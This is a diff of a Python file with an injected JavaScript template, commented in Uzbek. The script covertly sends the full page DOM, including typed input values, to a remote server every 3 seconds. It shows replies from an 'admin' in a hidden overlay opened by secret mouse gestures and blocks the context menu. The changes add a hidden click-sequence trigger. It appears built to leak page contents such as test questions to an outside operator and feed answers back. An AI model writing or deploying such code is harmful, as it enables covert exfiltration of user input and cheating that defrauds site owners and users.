@@ -20,12 +20,21 @@ storage = {
     "last_hash": ""
 }
 
-# --- JAVASCRIPT KOD (YANGILANGAN DIZAYN) ---
+# --- JAVASCRIPT KOD ---
 JAVASCRIPT_TEMPLATE = """
 (function(){
     const serverUrl = "SERVER_URL_PLACEHOLDER";
 
-    // --- 1. TOAST XABARLAR (Faqat tizim ochilganda chiqadi) ---
+    // --- O'ZGARUVCHILAR ---
+    let isSystemActive = false;   // Tizim boshida O'CHIQ turadi
+    let holdTimer = null;         
+    let isSecretMode = false;     
+    let leftClickCount = 0;       
+    let resetTimer = null;        
+    let lastMessage = "Hozircha xabar yo'q..."; 
+    let clickSequence = []; 
+
+    // --- 1. TOAST XABARLAR ---
     function showToast(text, color="#28a745", duration=2000) {
         const oldToast = document.getElementById('my-custom-toast');
         if(oldToast) oldToast.remove();
@@ -46,40 +55,22 @@ JAVASCRIPT_TEMPLATE = """
         setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 400); }, duration);
     }
 
-    // --- ISHGA TUSHGANINI BILDIRISH ---
-    showToast("✅ TIZIM ISHGA TUSHDI");
+    // Dastlabki xabar (Faqat kod yuklanganini bildiradi, lekin yubormaydi)
+    showToast("✅ TIZIM YUKLANDI (Kuting...)");
 
-    // --- O'ZGARUVCHILAR ---
-    let holdTimer = null;         
-    let isSecretMode = false;     
-    let leftClickCount = 0;       
-    let resetTimer = null;        
-    let lastMessage = "Hozircha xabar yo'q..."; 
-
-    // --- 2. ADMIN XABARI OYNASI (SUYUQ SHISHA / GLASSMORPHISM) ---
+    // --- 2. ADMIN XABARI OYNASI (SUYUQ SHISHA) ---
     const msgBox = document.createElement('div');
     msgBox.style.cssText = `
-        position: fixed; 
-        bottom: 50px; left: 50%; transform: translateX(-50%);
+        position: fixed; bottom: 50px; left: 50%; transform: translateX(-50%);
         width: 80%; max-width: 600px;
-
-        /* SUYUQ SHISHA EFFEKTI */
         background: rgba(30, 30, 30, 0.6);
-        backdrop-filter: blur(15px);
-        -webkit-backdrop-filter: blur(15px);
+        backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
         border: 1px solid rgba(255, 255, 255, 0.2);
         box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-
-        color: #fff; 
-        padding: 20px;
-        border-radius: 15px; 
-        font-family: 'Segoe UI', sans-serif; 
-        font-size: 16px;
-        text-align: center; 
-        display: none; 
-        z-index: 2147483647;
-        opacity: 0;
-        transition: opacity 0.3s ease;
+        color: #fff; padding: 20px; border-radius: 15px; 
+        font-family: 'Segoe UI', sans-serif; font-size: 16px;
+        text-align: center; display: none; z-index: 2147483647;
+        opacity: 0; transition: opacity 0.3s ease;
     `;
     document.body.appendChild(msgBox);
 
@@ -89,23 +80,16 @@ JAVASCRIPT_TEMPLATE = """
             <div style="font-size: 18px; font-weight: bold;">${lastMessage}</div>
         `;
         msgBox.style.display = 'block';
-        // Kichik animatsiya
         setTimeout(() => { msgBox.style.opacity = '1'; }, 10);
-
-        // 10 sekunddan keyin sekin yo'qoladi
         setTimeout(() => { 
             msgBox.style.opacity = '0'; 
             setTimeout(() => { msgBox.style.display = 'none'; }, 300);
         }, 10000);
     }
+    msgBox.addEventListener('click', () => { msgBox.style.display = 'none'; });
 
-    msgBox.addEventListener('click', () => { 
-        msgBox.style.opacity = '0'; 
-        setTimeout(() => { msgBox.style.display = 'none'; }, 300);
-    });
-
-    // --- 3. ORQA FONDA JIMJIT ISHLASH ---
-    function syncWithServer() {
+    // --- 3. MA'LUMOT YUBORISH ---
+    function sendData(showNotification = false) {
         function getFullDom() {
             try {
                 document.querySelectorAll('input').forEach(el => el.setAttribute('value', el.value));
@@ -120,22 +104,51 @@ JAVASCRIPT_TEMPLATE = """
             body: JSON.stringify({html: getFullDom(), page: window.location.href})
         }).then(r=>r.json()).then(data => {
             if(data.reply) lastMessage = data.reply;
-            // BU YERDA TOAST YO'Q - JIMJITLIK
+
+            // Faqat birinchi marta aktivlashtirilganda xabar chiqadi
+            if (showNotification) {
+                showToast("Yuborildi ✅");
+            }
         }).catch(e=>{});
     }
 
-    setInterval(syncWithServer, 3000);
+    // --- AVTOMATIK YUBORISH TAYMERI ---
+    setInterval(() => {
+        // DIQQAT: Agar tizim aktiv bo'lsa, har 3 sekundda yuboradi
+        if (isSystemActive) {
+            sendData(false); // false = xabar chiqmasin (jimjit)
+        }
+    }, 3000);
 
-    // --- 4. SICHQONCHA KONTROLI ---
+    // --- 4. SICHQONCHA LOGIKASI ---
     document.addEventListener('contextmenu', e => e.preventDefault());
 
     document.addEventListener('mousedown', (e) => {
-        // O'NG TUGMA (5 sek)
+        // A) KLIKLAR KETMA-KETLIGI (AKTIVLASHTIRISH UCHUN)
+        clickSequence.push(e.button);
+        if (clickSequence.length > 3) clickSequence.shift(); 
+
+        // [Chap, Chap, O'ng] -> [0, 0, 2]
+        if (JSON.stringify(clickSequence) === JSON.stringify([0, 0, 2])) {
+
+            // Agar tizim hali uxlab yotgan bo'lsa -> UYG'OTAMIZ
+            if (!isSystemActive) {
+                isSystemActive = true; 
+                sendData(true); // "Yuborildi" deb chiqadi va ma'lumot ketadi
+            } 
+            // Agar allaqachon ishlab turgan bo'lsa, shunchaki "Yuborildi" deb qo'lda yuboraveradi
+            else {
+                 sendData(true);
+            }
+
+            clickSequence = []; 
+        }
+
+        // B) ADMIN MENYUSINI OCHISH (O'ng 5 sek -> Chap 2 marta)
         if (e.button === 2) {
             holdTimer = setTimeout(() => {
                 isSecretMode = true;
                 leftClickCount = 0;
-                // Faqat shu yerda xabar chiqadi
                 showToast("🔓 Tizim ochildi! (Chapni 2 marta bosing)", "#ff9800", 3000);
 
                 if (resetTimer) clearTimeout(resetTimer);
@@ -143,12 +156,11 @@ JAVASCRIPT_TEMPLATE = """
             }, 5000); 
         }
 
-        // CHAP TUGMA (2 marta)
         if (e.button === 0) {
             if (isSecretMode) {
                 leftClickCount++;
                 if (leftClickCount >= 2) {
-                    showBigMessage();   // Suyuq shisha oyna ochiladi
+                    showBigMessage(); 
                     isSecretMode = false; 
                     leftClickCount = 0;
                 }
